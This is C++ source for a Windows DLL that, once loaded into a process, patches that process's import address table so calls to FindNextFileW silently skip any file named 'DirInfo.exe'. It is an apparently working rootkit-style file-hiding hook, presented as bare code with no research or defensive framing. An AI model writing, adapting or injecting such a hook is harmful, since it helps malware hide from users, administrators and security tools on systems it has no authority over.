/*
 *  
 */
#include <iostream>
#include <windows.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#include "pch.h"

void HookFunction();

typedef BOOL(WINAPI* PFNF)(
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAW lpFindFileData
    );

PFNF OriginalFindNextFileW = (PFNF)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FindNextFileW");

BOOL WINAPI FindNextFileHooked(
	_In_ HANDLE file_handle, 
	_Out_ LPWIN32_FIND_DATAW file_struct
) 
{
    BOOL success;
    do {
        success = OriginalFindNextFileW(file_handle, file_struct);
    } while (success && !wcscmp(L"DirInfo.exe", file_struct->cFileName));
    return success;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		HookFunction();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void HookFunction() {

	// Get module handle for currently running .exe
	HMODULE hModule = GetModuleHandle(NULL);

	LONG baseAddress = (LONG)hModule;

	// Get to optional PE header
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(baseAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);


	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Find kernel32.dll in the Import Directory Table
	while (pIID->Characteristics) {
		if (!strcmp("KERNEL32.dll", (char*)(baseAddress + pIID->Name)))
			break;
		pIID++;
	}

	// Search for NtQuerySystemInformation
	PIMAGE_THUNK_DATA pILT = (PIMAGE_THUNK_DATA)(baseAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((baseAddress + pIID->FirstThunk));

	while (!(pILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pILT->u1.AddressOfData) {
		PIMAGE_IMPORT_BY_NAME pIIBM = (PIMAGE_IMPORT_BY_NAME)(baseAddress + pILT->u1.AddressOfData);
		if (!strcmp("FindNextFileW", (char*)(pIIBM->Name)))
			break;
		pFirstThunkTest++;
		pILT++;
	}

	// Write over function pointer
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (DWORD)FindNextFileHooked;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

	//CloseHandle(hModule);
}

